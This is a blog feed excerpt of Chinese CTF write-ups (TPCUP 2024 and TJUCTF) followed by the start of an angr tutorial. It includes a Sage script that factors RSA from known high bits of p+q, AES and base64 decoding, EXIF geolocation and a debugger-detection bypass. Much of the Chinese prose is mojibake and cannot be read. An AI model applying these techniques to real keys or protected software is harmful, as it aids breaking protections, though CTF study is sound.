class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;7h3_hIT_LilaC_is_s0_N1c3!!&#125;</code></p><h2 id="bepbep"><a href="#bepbep" class="headerlink" title="bepbep"></a>bepbep</h2><h3 id="flag1-2"><a href="#flag1-2" class="headerlink" title="flag1"></a>flag1</h3><p>morse2ascii ä½ å€¼å¾—æ‹¥æœ‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">â¯ morse2ascii morse.wav</span><br><span class="line"></span><br><span class="line">MORSE2ASCII 0.2.1</span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open morse.wav</span><br><span class="line">wave size      597040</span><br><span class="line">format tag     1</span><br><span class="line">channels:      1</span><br><span class="line">samples/sec:   8000</span><br><span class="line">avg/bytes/sec: 8000</span><br><span class="line">block align:   1</span><br><span class="line">bits:          8</span><br><span class="line">samples:       597040</span><br><span class="line">bias adjust:   0</span><br><span class="line">volume peaks:  -31744 31744</span><br><span class="line">normalize:     1023</span><br><span class="line"></span><br><span class="line">- decoded morse data:</span><br><span class="line">flag  g3t  f14g  fr0m  mor3ecad3  add  underline  between  each  word  go  to  https:://storage..wearos..fans//amarket//name..wav  (all  lowercase))</span><br></pre></td></tr></table></figure><p><code>flag&#123;g3t_f14g_fr0m_mor3ecad3&#125;</code></p><h3 id="flag2-2"><a href="#flag2-2" class="headerlink" title="flag2"></a>flag2</h3><p>flag2 æ˜¯ SSTVï¼Œç”¨ Qsstv æ¥æ”¶å›¾åƒ</p><p>flag{SSTV_IS_VERY_INTERESTING}</p><blockquote><p>HEN HAO DE JIE MI AI LAI ZI TANG PING BEI</p></blockquote><h2 id="æˆ‘æœï¼Œå¤§ç›’"><a href="#æˆ‘æœï¼Œå¤§ç›’" class="headerlink" title="æˆ‘æœï¼Œå¤§ç›’"></a>æˆ‘æœï¼Œå¤§ç›’</h2><h3 id="flag1-3"><a href="#flag1-3" class="headerlink" title="flag1"></a>flag1</h3><blockquote><p>é—®é¢˜1ï¼šå›¾ç‰‡ä¸­çš„ä½ç½®é™„è¿‘æœ‰ä¸€æ¡é«˜é€Ÿå…¬è·¯ è¯·ç»™å‡ºé«˜é€Ÿå…¬è·¯ç¼–å·[G+ä¸¤ä½æ•°å­—]</p></blockquote><p>ä¸‹è½½ç…§ç‰‡åˆ°æ‰‹æœºï¼Œæœ‰æä¾› GPS ä¿¡æ¯ï¼Œç›´æ¥å®šä½ã€‚</p><blockquote><p>é—®é¢˜2ï¼šå›¾ç‰‡æ‰€åœ¨ä½ç½®æœ€è¿‘çš„å¸‚æ˜¯å“ªä¸ª[XX(X)å¸‚]</p></blockquote><p>åŒä¸Šï¼Œåœ°å›¾å¯çœ‹</p><blockquote><p>é—®é¢˜3ï¼šå›¾ç‰‡é‡‡ç”¨çš„ISOæ„Ÿå…‰åº¦æ˜¯å¤šå°‘</p></blockquote><p>çœ‹ä¸‹ exif iso</p><h3 id="flag2-3"><a href="#flag2-3" class="headerlink" title="flag2"></a>flag2</h3><p>åœ¨ <a href="http://cnrail.geogv.org/zhcn/station/41060731">ä¸­å›½é“è·¯åœ°å›¾ cnrail.geogv.org</a> æ‰¾ä¸‹ æ¼³å¿ã€é™‡å—ã€å¹¿å…ƒè¿™å‡ ä¸ªç«™ï¼Œç»“åˆçŸ­ä¿¡æ—¶é—´å°è¯•</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans1&quot;</span><span class="punctuation">:</span><span class="string">&quot;G75&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans2&quot;</span><span class="punctuation">:</span><span class="string">&quot;é˜†ä¸­å¸‚&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans3&quot;</span><span class="punctuation">:</span><span class="string">&quot;138&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans4&quot;</span><span class="punctuation">:</span><span class="string">&quot;D206&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">è¿™æ˜¯flag1flag<span class="punctuation">&#123;</span>wHO0ps_woc50_he<span class="punctuation">&#125;</span></span><br><span class="line">è¿™æ˜¯flag2flag<span class="punctuation">&#123;</span>a1_lA1_zI_gU0_T</span><br></pre></td></tr></table></figure><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><blockquote><p>ç­”é”™å‡ºé¢˜äººäº†ï¼Œæ‚²ï¼ˆ</p></blockquote><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>ã€æ•°æ®åˆ é™¤ã€‘<del>(æ¥è‡ªç¾¤èŠå¤©è®°å½•ï¼‰</del></p><h2 id="èººå¹³èŠå¤©å®¤2-0"><a href="#èººå¹³èŠå¤©å®¤2-0" class="headerlink" title="èººå¹³èŠå¤©å®¤2.0"></a>èººå¹³èŠå¤©å®¤2.0</h2><p>ç”¨ jadx-gui é€†å‘ apkï¼Œåœ¨ com.zhizi42.tpc2024.MainActivity æ‰¾åˆ°ä¸»è¦é€»è¾‘</p><h3 id="flag1-4"><a href="#flag1-4" class="headerlink" title="flag1"></a>flag1</h3><p>ç›´æ¥æŸ¥çœ‹å­—ç¬¦ä¸²</p><p><code>flag&#123;Th1s_1s_s0_s1mp1e&#125;</code></p><h3 id="flag2-4"><a href="#flag2-4" class="headerlink" title="flag2"></a>flag2</h3><p>base64 è§£ç  <code>ZmxhZ3tmbGFnYmFzZTY0fQ==</code><br><code>flag&#123;flagbase64&#125;</code></p><h3 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h3><p>ç‚¹å¼€ t2 å¯æ‰¾åˆ°<br>AES&#x2F;ECB&#x2F;PKCS5Padding è§£å¯† <code>e+Fy/ONEqoJVBIXzCLZ6Kx+vjukEgXFkOaet9ti3hrc=</code>ï¼Œå¯†é’¥æ˜¯ flag2<br><code>flag&#123;alldone!!!&#125;</code></p><h2 id="ä¸»å”±å¤ªæ‹¼å‘½äº†"><a href="#ä¸»å”±å¤ªæ‹¼å‘½äº†" class="headerlink" title="ä¸»å”±å¤ªæ‹¼å‘½äº†"></a>ä¸»å”±å¤ªæ‹¼å‘½äº†</h2><p>RSA å·²çŸ¥éƒ¨åˆ†é«˜ä½æ”»å‡»ï¼Œä½†æ•™ç¨‹ä¸€èˆ¬ç»™çš„æ˜¯å·²çŸ¥ p é«˜ä½ï¼Œæ²¡æœ‰å·²çŸ¥ p+q é«˜ä½çš„è§£æ³•<br>è¿™é‡Œ <a href="https://github.com/7feilee/ctf_writeup/blob/master/2020/HITCTF/crypto_dgk/src/solve.sage">https://github.com/7feilee/ctf_writeup&#x2F;blob&#x2F;master&#x2F;2020&#x2F;HITCTF&#x2F;crypto_dgk&#x2F;src&#x2F;solve.sage</a> æä¾›äº†</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p_pro = (p_add_q + <span class="built_in">int</span>(sqrt(p_add_q * p_add_q - <span class="number">4</span> * n))) // <span class="number">2</span></span><br></pre></td></tr></table></figure><p>ç¨å¾®æ”¹äº†ä¸€ä¸‹è„šæœ¬ç”¨ sage æ±‚è§£ p å’Œ q</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = <span class="number">99043577182118444378439642285640047958394971312102035300983634002184849658224373873268060886833728612494565170803226359641468271537155385458029052632983980837449378159671374748926031921883773305189594299358694724069728793519164632228950998545505807640604956250832692344226382573121014842953275020353743587393</span></span><br><span class="line">p_add_q = <span class="number">19908296297154261193603784476638931123516240704025306244561930935833463971799128110489967448460913311580547389743367260902522865073200825917723058108366848</span></span><br><span class="line">p_pro = (p_add_q + <span class="built_in">int</span>(sqrt(p_add_q * p_add_q - <span class="number">4</span> * n))) // <span class="number">2</span></span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(n), implementation = <span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">poly = p_pro + x</span><br><span class="line">x0 = poly.small_roots(X = <span class="number">2</span> ** <span class="number">100</span>, beta = <span class="number">0.4</span>)</span><br><span class="line">p = <span class="built_in">int</span>(gcd(p_pro + x0[<span class="number">0</span>], n))</span><br><span class="line">q = n // <span class="built_in">int</span>(p)</span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure><p>æ±‚å¾— p å’Œ q åå¯ä»¥è§£å¯†</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, inverse</span><br><span class="line"></span><br><span class="line">c = <span class="number">18440872486403323622510807012978507180529941426106643115456980837956295325764192595485820729772845428753953590301713705078399201869365193708057327848899904074671832807596665367550614919055119509073812499316019447070077472419739116237952486260179612984582496862441609849035603842161839069407115218245681423369</span></span><br><span class="line">n = <span class="number">99043577182118444378439642285640047958394971312102035300983634002184849658224373873268060886833728612494565170803226359641468271537155385458029052632983980837449378159671374748926031921883773305189594299358694724069728793519164632228950998545505807640604956250832692344226382573121014842953275020353743587393</span></span><br><span class="line">e = bytes_to_long(<span class="string">b&quot;too desperate!&quot;</span>)</span><br><span class="line">p = <span class="number">10157834627517369652898607336515095650881694895149683559384292084371259269447224625631118311560267756403388223138257762142383835818056617774624176508335047</span></span><br><span class="line">q = <span class="number">9750461669636891540705177140123835472634545808875622685177638851462204702351903484858849136900645555177159166605109498760139029255144208849671942596334519</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><p><code>flag&#123;th3_w0rld_1s_An0n_t0ky0&#125;</code></p><h2 id="æŠ•ç¨¿-CrackMe"><a href="#æŠ•ç¨¿-CrackMe" class="headerlink" title="[æŠ•ç¨¿]CrackMe"></a>[æŠ•ç¨¿]CrackMe</h2><p>ç”±äºæ˜¯é™æ€ flagï¼Œå› æ­¤åªè¦ç»•è¿‡è°ƒè¯•æ£€æµ‹å (åœ¨ <code>isDebuggerPresent</code>ã€<code>anti_debugger</code> åˆ¤æ–­å¤„ä¸‹æ–­ç‚¹è¿”å›å€¼æ”¹æˆ 0)ï¼Œåœ¨ <code>RSADecryptor</code> å‡½æ•°éƒ¨åˆ†ä¸‹æ–­ç‚¹è·å– v4 çš„å€¼å°±æ˜¯ flag</p><p><code>flag&#123;Xyu_h0is_z7Qs_l0VE&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TPCUP-2024&quot;&gt;&lt;a href=&quot;#TPCUP-2024&quot; class=&quot;headerlink&quot; title=&quot;TPCUP 2024&quot;&gt;&lt;/a&gt;TPCUP 2024&lt;/h1&gt;&lt;h2 id=&quot;Xâ€¦ä»€ä¹ˆï¼Ÿ&quot;&gt;&lt;a href=&quot;#Xâ€¦ä»€ä¹ˆï¼Ÿ&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>TJUCTFWP</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/25/TJUCTF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/25/TJUCTF/</id>
    <published>2024-02-24T16:00:00.000Z</published>
    <updated>2024-03-02T08:32:26.741Z</updated>
    
    <content type="html"><![CDATA[<p>TJUCTF{KFC_Cr42y_Thur5d4y_v_M3_50!}</p><p>base16:544A554354467B4B46435F43723432795F54687572356434795F765F4D335F3530217D</p><p>base32:GU2DIQJVGU2DGNJUGQ3DOQRUII2DMNBTGVDDIMZXGIZTIMZSG44TKRRVGQ3DQNZVG4ZDGNJWGQZTINZZGVDDONRVIY2EIMZTGVDDGNJTGAZDCN2E</p><p>base64:R1UyRElRSlZHVTJER05KVUdRM0RPUVJVSUkyRE1OQlRHVkRESU1aWEdJWlRJTVpTRzQ0VEtSUlZHUTNEUU5aVkc0WkRHTkpXR1FaVElOWlpHVkRET05SVklZMkVJTVpUR1ZEREdOSlRHQVpEQ04yRQ&#x3D;&#x3D;</p><p>base 91:</p><p>&amp;wâ€dA6D<em>t7f!}DfeFdJz<del>hF#Q8Jz@7</del>Q^tu0Z0+SB8</em>@@7dR#ww2&gt;y,#t7JbAPQiCP;1j95NGNlf{x{cPxXx*wnTAPPlo77d_OAeul[j@#F)1l<del>cF5nJS!nHg5rfFw_b%i@J!83NRM</del>(Ikge`ipeq;O6:Oâ€(XafRFP(dv+4SET$LI,tn1wWEW&#96;nH.3e</p><p>base100:ğŸğŸ‘®ğŸ™ğŸ‘›ğŸ¸ğŸ­ğŸ»ğŸ¡ğŸ‘«ğŸ®ğŸ‘ğŸ˜ğŸ‘´ğŸ»ğŸ‘ğŸ‘œğŸ½ğŸ‘›ğŸ‘ğŸ‘±ğŸ‘µğŸ‘ŸğŸ½ğŸšğŸ‘ˆğŸ¯ğŸ‘ğŸ‘±ğŸ·ğŸ®ğŸ‘µğŸ‘ˆğŸ‘•ğŸ‘«ğŸ‘¬ğŸ§ğŸ‘‘ğŸ§ğŸ¢ğŸ‘ŠğŸ¹ğŸ¯ğŸ¡ğŸ·ğŸ·ğŸ®ğŸ‘›ğŸ‘‰ğŸšğŸ‘®ğŸ‘®ğŸ©ğŸµğŸ‘°ğŸ£ğŸšğŸ‘«ğŸ®ğŸ‘ğŸ‘™ğŸ¸ğŸ‘‡ğŸ‘ˆğŸ‘ ğŸºğŸ‘‡ğŸ²ğŸ¨ğŸ‘¡ğŸ°ğŸ¬ğŸ‘…ğŸ¾ğŸ‘…ğŸ‘£ğŸ‘ğŸ‘²ğŸ‘¯ğŸ‘²ğŸ‘šğŸ‘‡ğŸ‘¯ğŸ‘ğŸ‘¯ğŸ¡ğŸ‘®ğŸ‘¥ğŸ‘‹ğŸ¸ğŸ‘‡ğŸ‘‡ğŸ‘£ğŸ‘¦ğŸ®ğŸ®ğŸ‘›ğŸ‘–ğŸ‘†ğŸ¸ğŸ‘œğŸ‘¬ğŸ‘£ğŸ‘’ğŸ‘¡ğŸ·ğŸšğŸ½ğŸ ğŸ¨ğŸ‘£ğŸ‘µğŸ‘šğŸ½ğŸ¬ğŸ‘¥ğŸ‘ğŸ‘ŠğŸ˜ğŸ‘¥ğŸ¿ğŸ‘ğŸ¬ğŸ‘©ğŸ‘ğŸ½ğŸ‘®ğŸ‘–ğŸ‘™ğŸœğŸ‘ ğŸ·ğŸ‘ğŸ˜ğŸ¯ğŸªğŸ‘…ğŸ‘‰ğŸ‘„ğŸ‘µğŸŸğŸ‘€ğŸ‘¢ğŸ‘ğŸ‘œğŸ‘—ğŸ‘ ğŸ‘§ğŸ‘œğŸ‘¨ğŸ²ğŸ‘†ğŸ­ğŸ±ğŸ‘†ğŸ™ğŸŸğŸ‘ğŸ‘˜ğŸ‘ğŸ‘‰ğŸ½ğŸ‘‡ğŸŸğŸ‘›ğŸ‘­ğŸ¢ğŸ«ğŸ‘ŠğŸ¼ğŸ‘‹ğŸ›ğŸ‘ƒğŸ‘€ğŸ£ğŸ‘«ğŸ‘¥ğŸ¨ğŸ‘®ğŸ‘ğŸ¼ğŸ‘ğŸ‘—ğŸ‘¥ğŸ¿ğŸ¥ğŸªğŸ‘œ</p><p><a href="https://www.cnblogs.com/chddt/p/13262385.html">https://www.cnblogs.com/chddt/p/13262385.html</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="æˆ‘flagå‘¢ï¼Ÿ"><a href="#æˆ‘flagå‘¢ï¼Ÿ" class="headerlink" title="æˆ‘flagå‘¢ï¼Ÿ"></a>æˆ‘flagå‘¢ï¼Ÿ</h3><p>**[å›¾ç‰‡éšå†™]**winhexä¿®æ”¹å›¾ç‰‡é•¿åº¦</p><h3 id="æ˜¯æ—¶å€™å‘æŒ¥ç¤¾å·¥æœ¬é¢†äº†"><a href="#æ˜¯æ—¶å€™å‘æŒ¥ç¤¾å·¥æœ¬é¢†äº†" class="headerlink" title="æ˜¯æ—¶å€™å‘æŒ¥ç¤¾å·¥æœ¬é¢†äº†"></a>æ˜¯æ—¶å€™å‘æŒ¥ç¤¾å·¥æœ¬é¢†äº†</h3><h3 id="bases"><a href="#bases" class="headerlink" title="bases"></a>bases</h3><p>**[å¤šé‡åŠ å¯†]**base100â€“91â€“64â€“32â€“16</p><h3 id="tttupperï¼"><a href="#tttupperï¼" class="headerlink" title="tttupperï¼"></a>tttupperï¼</h3><p>**[tupperåŠ å¯†]**ç”¨ç°æœ‰çš„å·¥å…·</p><h3 id="VVVigenere"><a href="#VVVigenere" class="headerlink" title="VVVigenere"></a>VVVigenere</h3><p><strong>[VigenereåŠ å¯†]</strong></p><h3 id="å¤©å¤–è™«é¸£"><a href="#å¤©å¤–è™«é¸£" class="headerlink" title="å¤©å¤–è™«é¸£"></a>å¤©å¤–è™«é¸£</h3><p>[ç‰¹æ®Šä¼ æ’­æ–¹å¼]SSTV</p><h3 id="è·¯è¿‡ä»€ä¹ˆéƒ½è¦æ‹"><a href="#è·¯è¿‡ä»€ä¹ˆéƒ½è¦æ‹" class="headerlink" title="è·¯è¿‡ä»€ä¹ˆéƒ½è¦æ‹"></a>è·¯è¿‡ä»€ä¹ˆéƒ½è¦æ‹</h3><p>**[ç¤¾å·¥]**æ ¹æ®å›¾ç‰‡ä¸­ä¸‰æ˜Ÿå †å’Œæˆéƒ½åœ°é“æ ‡å¿—ï¼ŒçŒœæµ‹å¾·é˜³ç«™</p><h3 id="å”‰ï¼æ— å°½çš„æ‹‰æ ¼æœ—æ—¥ï¼"><a href="#å”‰ï¼æ— å°½çš„æ‹‰æ ¼æœ—æ—¥ï¼" class="headerlink" title="å”‰ï¼æ— å°½çš„æ‹‰æ ¼æœ—æ—¥ï¼"></a>å”‰ï¼æ— å°½çš„æ‹‰æ ¼æœ—æ—¥ï¼</h3><p>keyæ˜¯16è¿›åˆ¶è½¬å­—ç¬¦åæ–‡å­—åŠ å¯†</p><p>éŸ³é¢‘å‡ºå¯†ç ï¼Œæ³¨æ„æ–‡ä»¶åè¦å¤§å†™ï¼Œsteghideéšå†™</p><h3 id="è¿›é˜¶-æ—¥å¿—åˆ†æ"><a href="#è¿›é˜¶-æ—¥å¿—åˆ†æ" class="headerlink" title="[è¿›é˜¶]æ—¥å¿—åˆ†æ"></a>[è¿›é˜¶]æ—¥å¿—åˆ†æ</h3><p>ç”µè„‘ä¸æ–¹ä¾¿çœ‹ï¼Œè½¬æˆtxtæˆ–è€…csvï¼Œ</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="å…¥é—¨-ä»å¤´å¼€å§‹äº†è§£é€†å‘"><a href="#å…¥é—¨-ä»å¤´å¼€å§‹äº†è§£é€†å‘" class="headerlink" title="[å…¥é—¨]ä»å¤´å¼€å§‹äº†è§£é€†å‘"></a>[å…¥é—¨]ä»å¤´å¼€å§‹äº†è§£é€†å‘</h3><p>ä¸€ä¸ªç®€å•çš„å¼‚æˆ–æ“ä½œ</p><h3 id="å…¥é—¨-111çœŸç­¾åˆ°"><a href="#å…¥é—¨-111çœŸç­¾åˆ°" class="headerlink" title="[å…¥é—¨]111çœŸç­¾åˆ°"></a>[å…¥é—¨]111çœŸç­¾åˆ°</h3><p>ç”¨IDAçœ‹ç¨‹åºçš„ç®€å•å¼‚æˆ–æ“ä½œ</p><h3 id="è„‘æ´-Artï¼"><a href="#è„‘æ´-Artï¼" class="headerlink" title="[è„‘æ´]Artï¼"></a>[è„‘æ´]Artï¼</h3><p>ä¿®æ”¹IDAæœ€é«˜å±•ç¤ºå­—èŠ‚ç ï¼Œåœ¨ç¼©ç•¥å›¾çœ‹flag</p><h3 id="åŸºç¡€-Soyoï¼Œæ¥æ¯çº¢èŒ¶"><a href="#åŸºç¡€-Soyoï¼Œæ¥æ¯çº¢èŒ¶" class="headerlink" title="[åŸºç¡€]Soyoï¼Œæ¥æ¯çº¢èŒ¶"></a>[åŸºç¡€]Soyoï¼Œæ¥æ¯çº¢èŒ¶</h3><p>æç¤ºæ˜¯teaåŠ å¯†ï¼Œçœ‹ç‰¹å¾å’Œkeyå€¼</p><p>ç„¶åteaè§£ç </p><h3 id="è„‘æ´-æƒ³ç©å„¿çº¢ç™½æœºäº†"><a href="#è„‘æ´-æƒ³ç©å„¿çº¢ç™½æœºäº†" class="headerlink" title="[è„‘æ´]æƒ³ç©å„¿çº¢ç™½æœºäº†"></a>[è„‘æ´]æƒ³ç©å„¿çº¢ç™½æœºäº†</h3><h4 id="æ³•ä¸€ï¼š"><a href="#æ³•ä¸€ï¼š" class="headerlink" title="æ³•ä¸€ï¼š"></a>æ³•ä¸€ï¼š</h4><p>å¥½ç”¨çš„å·¥å…·ï¼Œ</p><h4 id="æ³•äºŒï¼š"><a href="#æ³•äºŒï¼š" class="headerlink" title="æ³•äºŒï¼š"></a>æ³•äºŒï¼š</h4><p>äº†è§£ç¨‹åºè¿è¡Œå†…å®¹ï¼Œå†™è„šæœ¬</p><h3 id="åŸºç¡€-ezRE"><a href="#åŸºç¡€-ezRE" class="headerlink" title="[åŸºç¡€]ezRE"></a>[åŸºç¡€]ezRE</h3><h4 id="æ³•ä¸€ï¼š-1"><a href="#æ³•ä¸€ï¼š-1" class="headerlink" title="æ³•ä¸€ï¼š"></a>æ³•ä¸€ï¼š</h4><p>ollvmåæ··æ·†</p><h4 id="æ³•äºŒï¼šï¼ˆéé¢„æœŸï¼‰"><a href="#æ³•äºŒï¼šï¼ˆéé¢„æœŸï¼‰" class="headerlink" title="æ³•äºŒï¼šï¼ˆéé¢„æœŸï¼‰"></a>æ³•äºŒï¼šï¼ˆéé¢„æœŸï¼‰</h4><p>çœ‹ç¨‹åºæ¨ç†åŠ å¯†æ–¹å¼ï¼Œ</p><p>å…ˆæ”¹è¡¨ï¼Œå†åŠ å¯†</p><p>å—¯â€¦â€¦å¾ˆç®€å•ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;TJUCTF{KFC_Cr42y_Thur5d4y_v_M3_50!}&lt;/p&gt;
&lt;p&gt;base16:544A554354467B4B46435F43723432795F54687572356434795F765F4D335F3530217D&lt;/p&gt;
&lt;p&gt;base32:GU</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ç¬¦å·æ‰§è¡Œæ¡†æ¶</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/18/angr_%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6angr/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/18/angr_%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6angr/</id>
    <published>2024-02-17T16:00:00.000Z</published>
    <updated>2024-03-02T08:35:44.027Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¬¦å·æ‰§è¡Œæ¡†æ¶"><a href="#ç¬¦å·æ‰§è¡Œæ¡†æ¶" class="headerlink" title="ç¬¦å·æ‰§è¡Œæ¡†æ¶"></a>ç¬¦å·æ‰§è¡Œæ¡†æ¶</h1><h2 id="ç¬¦å·æ‰§è¡Œä»‹ç»"><a href="#ç¬¦å·æ‰§è¡Œä»‹ç»" class="headerlink" title="ç¬¦å·æ‰§è¡Œä»‹ç»"></a>ç¬¦å·æ‰§è¡Œä»‹ç»</h2><p>éšç€æ—¶ä»£çš„å‘å±•ï¼Œç¨‹åºçš„æµç¨‹è¶Šæ¥è¶Šå¤æ‚ï¼Œå¦‚æœæˆ‘ä»¬ç»§ç»­åƒä»¥å‰é‚£æ ·åœ¨ ida é‡Œä»”ç»†åˆ†æï¼Œè‚¯å®šæ˜¯å¤ªç´¯äº†ï¼Œæ‰€ä»¥æœ‰äº›ç§‘å­¦å®¶æƒ³è¦ç”¨è‡ªåŠ¨åŒ–çš„ç®—æ³•æ¥è¿›è¡Œé€†å‘å·¥ç¨‹ï¼Œç„¶åï¼Œä»–ä»¬å°±æå‡ºäº†ç¬¦å·æ‰§è¡Œè¿™ä¸ªç®—æ³•ã€‚</p><p>ç¬¦å·æ‰§è¡Œç®—æ³•å¬èµ·æ¥å¾ˆé«˜ç«¯ï¼Œå…¶å®å†…éƒ¨ç®—æ³•å´å¹¶ä¸éš¾ç†è§£ï¼Œæ¥ä¸‹æ¥å°±ä»‹ç»ä¸€ä¸‹ç¬¦å·æ‰§è¡Œçš„æ ¸å¿ƒç†å¿µã€‚</p><p>å‡å¦‚æœ‰è¿™æ ·ä¸€ä¸ªç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> user_input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;user_input);</span><br><span class="line"><span class="keyword">if</span> (user_input - <span class="number">10</span> &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç°åœ¨æƒ³è¦çŸ¥é“ä¸ºäº†è®©ç¨‹åºåˆ°è¾¾ puts(â€˜Success.â€™) è¿™ä¸€è¡Œï¼Œéœ€è¦çš„è¾“å…¥æ¡ä»¶æ˜¯ä»€ä¹ˆï¼Œé‚£æˆ‘ä»¬è¦æ€ä¹ˆå¾—å‡ºåˆ°è¾¾è¿™ä¸€è¡Œçš„æ¡ä»¶å‘¢ï¼Ÿé¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹æ‰§è¡Œè¿™ä¸ªç¨‹åºçš„æ—¶å€™ï¼Œuser_input éƒ½ç»å†äº†ä»€ä¹ˆã€‚</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240216232938209.png" alt="image-20240216232938209"></p><p>user_input ç»è¿‡äº†ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼Œå…¶ä¸­ user_input - 10&gt;&#x3D; 0 å°±æ˜¯æˆåŠŸçš„æ¡ä»¶ã€‚æ‰€ä»¥å¾ˆæ˜¾ç„¶ï¼Œæˆ‘ä»¬åª</p><p>è¦å°†è¿™ä¸ªä¸ç­‰å¼è§£å‡ºæ¥ï¼Œå°±èƒ½çŸ¥é“éœ€è¦çš„æ¡ä»¶äº†ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å‡å¦‚è¯´æœ‰ä¸€ä¸ªè¿™æ ·çš„ç¨‹åºå‘¢ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> user_input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;user_input);</span><br><span class="line"><span class="keyword">if</span> (user_input - <span class="number">10</span> &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> (user_input &lt;= <span class="number">20</span>)</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Try 